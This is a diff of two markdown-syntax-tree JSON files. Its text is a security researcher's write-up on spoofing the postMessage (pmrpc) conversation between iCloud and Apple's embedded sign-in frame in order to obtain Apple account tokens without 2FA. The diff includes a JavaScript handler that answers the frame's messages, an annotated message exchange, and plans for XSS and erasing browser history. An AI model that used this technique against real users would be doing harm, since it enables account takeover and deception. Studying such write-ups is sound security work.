>                             "end": {
>                               "line": 1047,
>                               "column": 234,
>                               "offset": 52931
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "postMessage",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 234,
>                               "offset": 52931
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 247,
>                               "offset": 52944
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": "s from our embedded ",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 247,
>                               "offset": 52944
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 267,
>                               "offset": 52964
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "idmsa.apple.com",
>                           "position": {
>                             "start": {
>                               "line": 1047,
>                               "column": 267,
>                               "offset": 52964
>                             },
>                             "end": {
>                               "line": 1047,
>                               "column": 284,
>                               "offset": 52981
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 1047,
>                           "column": 4,
>                           "offset": 52701
>                         },
>                         "end": {
>                           "line": 1047,
>                           "column": 284,
>                           "offset": 52981
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 1047,
>                       "column": 1,
>                       "offset": 52698
>                     },
>                     "end": {
>                       "line": 1047,
>                       "column": 284,
>                       "offset": 52981
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
12224,12226c19319,19321
<                   "line": 775,
<                   "column": 317,
<                   "offset": 37369
---
>                   "line": 1041,
>                   "column": 1,
>                   "offset": 51718
12229,12231c19324,19326
<                   "line": 775,
<                   "column": 323,
<                   "offset": 37375
---
>                   "line": 1047,
>                   "column": 284,
>                   "offset": 52981
12233c19328,19335
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
12235,12395d19336
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 316,
<               "offset": 37368
<             },
<             "end": {
<               "line": 775,
<               "column": 324,
<               "offset": 37376
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " code on the very first line. So looking at ",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 324,
<               "offset": 37376
<             },
<             "end": {
<               "line": 775,
<               "column": 368,
<               "offset": 37420
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://appleid.cdn-apple.com/appleauth/static/jsj/N1575552449/app.js",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 368,
<               "offset": 37420
<             },
<             "end": {
<               "line": 775,
<               "column": 439,
<               "offset": 37491
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " we set a custom breakpoint on the first line that runs ",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 439,
<               "offset": 37491
<             },
<             "end": {
<               "line": 775,
<               "column": 495,
<               "offset": 37547
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.addEventListener('message', m => console.log(m))",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 495,
<               "offset": 37547
<             },
<             "end": {
<               "line": 775,
<               "column": 552,
<               "offset": 37604
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 775,
<               "column": 552,
<               "offset": 37604
<             },
<             "end": {
<               "line": 775,
<               "column": 553,
<               "offset": 37605
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 775,
<           "column": 1,
<           "offset": 37053
<         },
<         "end": {
<           "line": 775,
<           "column": 553,
<           "offset": 37605
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This gives us the other half of the conversation, because ",
<           "position": {
<             "start": {
<               "line": 777,
<               "column": 1,
<               "offset": 37609
<             },
<             "end": {
<               "line": 777,
<               "column": 59,
<               "offset": 37667
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "app.js",
<           "position": {
<             "start": {
<               "line": 777,
<               "column": 59,
<               "offset": 37667
<             },
<             "end": {
<               "line": 777,
<               "column": 67,
<               "offset": 37675
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " runs ",
<           "position": {
<             "start": {
<               "line": 777,
<               "column": 67,
<               "offset": 37675
12397,12407d19337
<             "end": {
<               "line": 777,
<               "column": 73,
<               "offset": 37681
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
12409,12410c19339,19392
<               "type": "text",
<               "value": "as soon as the singin page loads",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "What's at the end of this long road? Having tricked ",
>                   "position": {
>                     "start": {
>                       "line": 1049,
>                       "column": 1,
>                       "offset": 52985
>                     },
>                     "end": {
>                       "line": 1049,
>                       "column": 53,
>                       "offset": 53037
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 1049,
>                       "column": 53,
>                       "offset": 53037
>                     },
>                     "end": {
>                       "line": 1049,
>                       "column": 70,
>                       "offset": 53054
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " into thinking that we're iCloud, when you log in to our embed with your autofilled email we get an authentication for your Apple account. Even if you don't 2FA! This is because an authentication token is granted without passing 2FA for iCloud 'Find My', used for finding your potentially lost phone which you might need to pass 2FA.",
>                   "position": {
>                     "start": {
>                       "line": 1049,
>                       "column": 70,
>                       "offset": 53054
>                     },
>                     "end": {
>                       "line": 1049,
>                       "column": 403,
>                       "offset": 53387
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
12413,12415c19395,19397
<                   "line": 777,
<                   "column": 74,
<                   "offset": 37682
---
>                   "line": 1049,
>                   "column": 1,
>                   "offset": 52985
12418,12420c19400,19402
<                   "line": 777,
<                   "column": 106,
<                   "offset": 37714
---
>                   "line": 1049,
>                   "column": 403,
>                   "offset": 53387
12424,12839d19405
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 777,
<               "column": 73,
<               "offset": 37681
<             },
<             "end": {
<               "line": 777,
<               "column": 107,
<               "offset": 37715
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 777,
<               "column": 107,
<               "offset": 37715
<             },
<             "end": {
<               "line": 777,
<               "column": 108,
<               "offset": 37716
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 777,
<           "column": 1,
<           "offset": 37609
<         },
<         "end": {
<           "line": 777,
<           "column": 108,
<           "offset": 37716
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Here's a full, successful annotated conversation between parent (iCloud) and child (Apple ID):",
<           "position": {
<             "start": {
<               "line": 779,
<               "column": 1,
<               "offset": 37720
<             },
<             "end": {
<               "line": 779,
<               "column": 95,
<               "offset": 37814
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 779,
<           "column": 1,
<           "offset": 37720
<         },
<         "end": {
<           "line": 779,
<           "column": 95,
<           "offset": 37814
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "json",
<       "meta": null,
<       "value": "\nI'm ready, are you ready?\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"ready\"],\"id\":\"9BA799AA-6777-4DCC-A615-A8758C9E9CE2\"}\n\nyeah bro im ready . lets do this\n\nparent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"9BA799AA-6777-4DCC-A615-A8758C9E9CE2\",\"result\":true}\n\nalright. i am calling myself \"Sign In With Your Apple ID\"\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"ready\",\"params\":[{\"iframeTitle\":\" Sign In with Your Apple ID\"}],\"id\":\"E0236187-9F33-42BC-AD1C-4F3866803C55\"}\n\ncool bro. cool bro. very cool. keep it coming\n\nparent : pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"E0236187-9F33-42BC-AD1C-4F3866803C55\",\"result\":true}\n\nok bro, let me know how i should configure the login dialog. that cool bro\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"receivePingRequest\",\"params\":[\"config\"],\"id\":\"87A8E469-8A6B-4124-8BB0-1A1AB40416CD\"}\n\nyeah bro. very cool. very cool.\n\nparent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"87A8E469-8A6B-4124-8BB0-1A1AB40416CD\",\"result\":true}\n\nok dude hit me with that config stuff\n\nchild: pmrpc.{\"jsonrpc\":\"2.0\",\"method\":\"config\",\"params\":[],\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\"}\n\nno worries my dude. make sure theres a remember me box. and uh. don't need a link to create an account. that wouldn't make sense. do need a link for if they forget their password. call the dialog \"sign in with iCloud\". heres the logo. keep it fresh my man.\n\nparent: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\",\"result\":{\"data\":{\"features\":{\"rememberMe\":true,\"createLink\":false,\"iForgotLink\":true,\"pause2FA\":false},\"signInLabel\":\"Sign in to iCloud\",\"serviceKey\":\"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\",\"defaultAccountNameAutoFillDomain\":\"icloud.com\",\"trustTokens\":[\"HSARMTnl/S90E=SRVX\"],\"rememberMeLabel\":\"keep-me-signed-in\",\"theme\":\"dark\",\"waitAnimationOnAuthComplete\":false,\"logo\":{\"src\":\"data:image/png;base64,[ ... ]ErkJggg==\",\"width\":\"100px\"}}}}\n\nand I'm out\n\nparent sends: pmrpc.{\"jsonrpc\":\"2.0\",\"id\":\"252F2BC4-98E8-4254-9B19-FB8042A78E0B\",\"result\":true}",
<       "position": {
<         "start": {
<           "line": 780,
<           "column": 1,
<           "offset": 37816
<         },
<         "end": {
<           "line": 817,
<           "column": 4,
<           "offset": 39871
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Still with me? Cool bro. Very cool. This conversation is kinda complicated, but for most of it we can just send back the mesage ID they send us back and ",
<           "position": {
<             "start": {
<               "line": 819,
<               "column": 1,
<               "offset": 39875
<             },
<             "end": {
<               "line": 819,
<               "column": 154,
<               "offset": 40028
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "\"result\": true",
<           "position": {
<             "start": {
<               "line": 819,
<               "column": 154,
<               "offset": 40028
<             },
<             "end": {
<               "line": 819,
<               "column": 170,
<               "offset": 40044
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". Here's how I implemented this conversation:",
<           "position": {
<             "start": {
<               "line": 819,
<               "column": 170,
<               "offset": 40044
<             },
<             "end": {
<               "line": 819,
<               "column": 215,
<               "offset": 40089
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 819,
<           "column": 1,
<           "offset": 39875
<         },
<         "end": {
<           "line": 819,
<           "column": 215,
<           "offset": 40089
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "\n      const prefix = \"pmrpc.\"\n\n      if (!data.startsWith(prefix)) throw new Error(`got weird messsage ${JSON.stringify(data)}`);\n\n      // trim off 'pmrpc.'\n      const json = data.slice(prefix.length);\n\n      // extract the request JSON\n      const rq = JSON.parse(json);\n\n      const { method, jsonrpc, params, id } = rq;\n\n      // if we get a config, just return our pre-prepared response\n      if (method == \"config\") return frame.postMessage(`${prefix}${JSON.stringify({\n        ...config_resp, jsonrpc, id\n      })}`, \"*\");\n\n\n      // for everything else just tell the child it went OK\n      frame.postMessage(`${prefix}${JSON.stringify({\n        jsonrpc, id, result: true\n      })}`, \"*\");",
<       "position": {
<         "start": {
<           "line": 821,
<           "column": 1,
<           "offset": 40093
<         },
<         "end": {
<           "line": 845,
<           "column": 4,
<           "offset": 40833
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I know what you're thinking, postMessage fans. Doesn't ",
<           "position": {
<             "start": {
<               "line": 847,
<               "column": 1,
<               "offset": 40837
<             },
<             "end": {
<               "line": 847,
<               "column": 56,
<               "offset": 40892
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 847,
<               "column": 56,
<               "offset": 40892
<             },
<             "end": {
<               "line": 847,
<               "column": 69,
<               "offset": 40905
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " secure all of its calls by specifying where the messages go to, making this completely useless? postMessage fans, you'd be correct.",
<           "position": {
<             "start": {
<               "line": 847,
<               "column": 69,
<               "offset": 40905
<             },
<             "end": {
<               "line": 847,
<               "column": 201,
<               "offset": 41037
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 847,
<           "column": 1,
<           "offset": 40837
<         },
<         "end": {
<           "line": 847,
<           "column": 201,
<           "offset": 41037
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "PostMessage Fans, You'd Be Correct.",
<           "position": {
<             "start": {
<               "line": 849,
<               "column": 1,
<               "offset": 41041
<             },
<             "end": {
<               "line": 849,
<               "column": 36,
<               "offset": 41076
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 849,
<           "column": 1,
<           "offset": 41041
<         },
<         "end": {
<           "line": 850,
<           "column": 36,
<           "offset": 41113
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "postmessage fans, you'd be correct.",
<       "label": "PostMessage Fans, You'd Be Correct.",
<       "title": null,
<       "url": "#postmessage-fans-youd-be-correct",
<       "position": {
<         "start": {
<           "line": 851,
<           "column": 1,
<           "offset": 41115
<         },
<         "end": {
<           "line": 851,
<           "column": 73,
<           "offset": 41187
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§7",
<       "label": "§7",
<       "title": null,
<       "url": "#postmessage-fans-youd-be-correct",
<       "position": {
<         "start": {
<           "line": 852,
<           "column": 1,
<           "offset": 41189
<         },
<         "end": {
<           "line": 852,
<           "column": 40,
<           "offset": 41228
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We have two problems at this point to address:",
<           "position": {
<             "start": {
<               "line": 855,
<               "column": 1,
<               "offset": 41234
<             },
<             "end": {
<               "line": 855,
<               "column": 47,
<               "offset": 41280
12841,12869d19406
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 855,
<           "column": 1,
<           "offset": 41234
<         },
<         "end": {
<           "line": 855,
<           "column": 47,
<           "offset": 41280
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "list",
<       "ordered": true,
<       "start": 1,
<       "spread": false,
<       "children": [
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
12875c19412
<                   "value": "Messages we send to ",
---
>                   "value": "We've compromised the trust between ",
12878,12880c19415,19417
<                       "line": 857,
<                       "column": 4,
<                       "offset": 41287
---
>                       "line": 1051,
>                       "column": 1,
>                       "offset": 53391
12883,12885c19420,19422
<                       "line": 857,
<                       "column": 24,
<                       "offset": 41307
---
>                       "line": 1051,
>                       "column": 37,
>                       "offset": 53427
12895,12897c19432,19434
<                       "line": 857,
<                       "column": 24,
<                       "offset": 41307
---
>                       "line": 1051,
>                       "column": 37,
>                       "offset": 53427
12900,12902c19437,19439
<                       "line": 857,
<                       "column": 41,
<                       "offset": 41324
---
>                       "line": 1051,
>                       "column": 54,
>                       "offset": 53444
12909c19446
<                   "value": " aren't being accepted",
---
>                   "value": " and iCloud. But there's more to do here. What if we could take over ",
12912,12914c19449,19451
<                       "line": 857,
<                       "column": 41,
<                       "offset": 41324
---
>                       "line": 1051,
>                       "column": 54,
>                       "offset": 53444
12917,12919c19454,19592
<                       "line": 857,
<                       "column": 63,
<                       "offset": 41346
---
>                       "line": 1051,
>                       "column": 123,
>                       "offset": 53513
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 123,
>                       "offset": 53513
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 140,
>                       "offset": 53530
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " in the user's client? As gullible as users are, our browser doesn't currently show ",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 140,
>                       "offset": 53530
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 224,
>                       "offset": 53614
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "apple.com",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 224,
>                       "offset": 53614
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 235,
>                       "offset": 53625
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " in the address bar. We can't popout the Apple ID login window, because the postMessage code specifically refers to ",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 235,
>                       "offset": 53625
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 351,
>                       "offset": 53741
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.parent",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 351,
>                       "offset": 53741
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 366,
>                       "offset": 53756
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", rather than ",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 366,
>                       "offset": 53756
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 380,
>                       "offset": 53770
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "window.opener",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 380,
>                       "offset": 53770
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 395,
>                       "offset": 53785
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 1051,
>                       "column": 395,
>                       "offset": 53785
>                     },
>                     "end": {
>                       "line": 1051,
>                       "column": 396,
>                       "offset": 53786
12927,12929c19600,19602
<                   "line": 857,
<                   "column": 4,
<                   "offset": 41287
---
>                   "line": 1051,
>                   "column": 1,
>                   "offset": 53391
12932,12934c19605,19607
<                   "line": 857,
<                   "column": 63,
<                   "offset": 41346
---
>                   "line": 1051,
>                   "column": 396,
>                   "offset": 53786
12938,12949d19610
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 857,
<               "column": 1,
<               "offset": 41284
<             },
<             "end": {
<               "line": 857,
<               "column": 63,
<               "offset": 41346
12951,12958d19611
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
12964c19617
<                   "value": "The browser rejects messages sent to us from ",
---
>                   "value": "If we manage to get XSS from the position we're in now, we could open a popup from our compromised, embedded page into a 'real' ",
12967,12969c19620,19622
<                       "line": 858,
<                       "column": 4,
<                       "offset": 41351
---
>                       "line": 1053,
>                       "column": 1,
>                       "offset": 53790
12972,12974c19625,19627
<                       "line": 858,
<                       "column": 49,
<                       "offset": 41396
---
>                       "line": 1053,
>                       "column": 129,
>                       "offset": 53918
12984,12986c19637,19639
<                       "line": 858,
<                       "column": 49,
<                       "offset": 41396
---
>                       "line": 1053,
>                       "column": 129,
>                       "offset": 53918
12989,12991c19642,19644
<                       "line": 858,
<                       "column": 66,
<                       "offset": 41413
---
>                       "line": 1053,
>                       "column": 146,
>                       "offset": 53935
12998c19651
<                   "value": " because they're specifying the origin ",
---
>                   "value": " page, and attack the popup from our embedded window. Once we've taken over the popup, we can use ",
13001,13003c19654,19656
<                       "line": 858,
<                       "column": 66,
<                       "offset": 41413
---
>                       "line": 1053,
>                       "column": 146,
>                       "offset": 53935
13006,13008c19659,19661
<                       "line": 858,
<                       "column": 105,
<                       "offset": 41452
---
>                       "line": 1053,
>                       "column": 244,
>                       "offset": 54033
13015c19668
<                   "value": "icloud.com",
---
>                   "value": "window.location.assign('https://apple.com')",
13018,13020c19671,19673
<                       "line": 858,
<                       "column": 105,
<                       "offset": 41452
---
>                       "line": 1053,
>                       "column": 244,
>                       "offset": 54033
13023,13025c19676,19678
<                       "line": 858,
<                       "column": 117,
<                       "offset": 41464
---
>                       "line": 1053,
>                       "column": 289,
>                       "offset": 54078
13032c19685
<                   "value": ".",
---
>                   "value": " to destroy our entry in the user history so it's not possible for the user to see that they were ever on a non-apple website.",
13035,13037c19688,19690
<                       "line": 858,
<                       "column": 117,
<                       "offset": 41464
---
>                       "line": 1053,
>                       "column": 289,
>                       "offset": 54078
13040,13042c19693,19695
<                       "line": 858,
<                       "column": 118,
<                       "offset": 41465
---
>                       "line": 1053,
>                       "column": 415,
>                       "offset": 54204
13050,13052c19703,19705
<                   "line": 858,
<                   "column": 4,
<                   "offset": 41351
---
>                   "line": 1053,
>                   "column": 1,
>                   "offset": 53790
13055,13057c19708,19710
<                   "line": 858,
<                   "column": 118,
<                   "offset": 41465
---
>                   "line": 1053,
>                   "column": 415,
>                   "offset": 54204
13063,13933c19716,19717
<           "position": {
<             "start": {
<               "line": 858,
<               "column": 1,
<               "offset": 41348
<             },
<             "end": {
<               "line": 858,
<               "column": 118,
<               "offset": 41465
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 857,
<           "column": 1,
<           "offset": 41284
<         },
<         "end": {
<           "line": 858,
<           "column": 118,
<           "offset": 41465
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "While I did this using the minified code ",
<           "position": {
<             "start": {
<               "line": 860,
<               "column": 1,
<               "offset": 41469
<             },
<             "end": {
<               "line": 860,
<               "column": 42,
<               "offset": 41510
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 860,
<               "column": 42,
<               "offset": 41510
<             },
<             "end": {
<               "line": 860,
<               "column": 59,
<               "offset": 41527
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " was running, our solution to (1) is easier illustrated with the original 'pmrpc' source code, from the library apple is using:",
<           "position": {
<             "start": {
<               "line": 860,
<               "column": 59,
<               "offset": 41527
<             },
<             "end": {
<               "line": 860,
<               "column": 186,
<               "offset": 41654
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 860,
<           "column": 1,
<           "offset": 41469
<         },
<         "end": {
<           "line": 860,
<           "column": 186,
<           "offset": 41654
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": " function processPmrpcMessage(eventParams) {\n    var serviceCallEvent = eventParams.event;\n    var eventSource = eventParams.source;\n    var isWorkerComm = typeof eventSource !== \"undefined\" && eventSource !== null;\n\n    // if the message is not for pmrpc, ignore it.\n    if (typeof serviceCallEvent.data !== \"string\" || serviceCallEvent.data.indexOf(\"pmrpc.\") !== 0) {\n      return;\n    } else {\n      var message = decode(serviceCallEvent.data);\n\n      if (typeof message.method !== \"undefined\") {\n        // this is a request\n\n        var newServiceCallEvent = {\n          data : serviceCallEvent.data,\n          source : isWorkerComm ? eventSource : serviceCallEvent.source,\n          origin : isWorkerComm ? \"*\" : serviceCallEvent.origin,\n          shouldCheckACL : !isWorkerComm\n        };\n\n        var response = processJSONRpcRequest(message, newServiceCallEvent);\n\n        // return the response\n        if (response !== null) {\n          sendPmrpcMessage(\n            newServiceCallEvent.source, response, newServiceCallEvent.origin);\n        }\n      } else {\n        // this is a response\n        processJSONRpcResponse(message);\n      }\n    }\n  }",
<       "position": {
<         "start": {
<           "line": 862,
<           "column": 1,
<           "offset": 41658
<         },
<         "end": {
<           "line": 897,
<           "column": 4,
<           "offset": 42869
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Notice ",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 1,
<               "offset": 42873
<             },
<             "end": {
<               "line": 899,
<               "column": 8,
<               "offset": 42880
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "shouldCheckACL",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 8,
<               "offset": 42880
<             },
<             "end": {
<               "line": 899,
<               "column": 24,
<               "offset": 42896
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "? This actually determines if pmrpc should check to see if we are ",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 24,
<               "offset": 42896
<             },
<             "end": {
<               "line": 899,
<               "column": 90,
<               "offset": 42962
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 90,
<               "offset": 42962
<             },
<             "end": {
<               "line": 899,
<               "column": 102,
<               "offset": 42974
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". It's derived from ",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 102,
<               "offset": 42974
<             },
<             "end": {
<               "line": 899,
<               "column": 122,
<               "offset": 42994
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "!isWorkerComm",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 122,
<               "offset": 42994
<             },
<             "end": {
<               "line": 899,
<               "column": 137,
<               "offset": 43009
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". I haven't the faintest idea what a ",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 137,
<               "offset": 43009
<             },
<             "end": {
<               "line": 899,
<               "column": 174,
<               "offset": 43046
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "WorkerComm",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 174,
<               "offset": 43046
<             },
<             "end": {
<               "line": 899,
<               "column": 186,
<               "offset": 43058
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is but ",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 186,
<               "offset": 43058
<             },
<             "end": {
<               "line": 899,
<               "column": 194,
<               "offset": 43066
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "isWorkerComm",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 194,
<               "offset": 43066
<             },
<             "end": {
<               "line": 899,
<               "column": 208,
<               "offset": 43080
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is calculated right at the top:",
<           "position": {
<             "start": {
<               "line": 899,
<               "column": 208,
<               "offset": 43080
<             },
<             "end": {
<               "line": 899,
<               "column": 240,
<               "offset": 43112
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 899,
<           "column": 1,
<           "offset": 42873
<         },
<         "end": {
<           "line": 899,
<           "column": 240,
<           "offset": 43112
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": " function processPmrpcMessage(eventParams) {\n    var serviceCallEvent = eventParams.event;\n    var eventSource = eventParams.source;\n    var isWorkerComm = typeof eventSource !== \"undefined\" && eventSource !== null;",
<       "position": {
<         "start": {
<           "line": 901,
<           "column": 1,
<           "offset": 43116
<         },
<         "end": {
<           "line": 906,
<           "column": 4,
<           "offset": 43354
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Our ",
<           "position": {
<             "start": {
<               "line": 908,
<               "column": 1,
<               "offset": 43358
<             },
<             "end": {
<               "line": 908,
<               "column": 5,
<               "offset": 43362
<             },
<             "indent": []
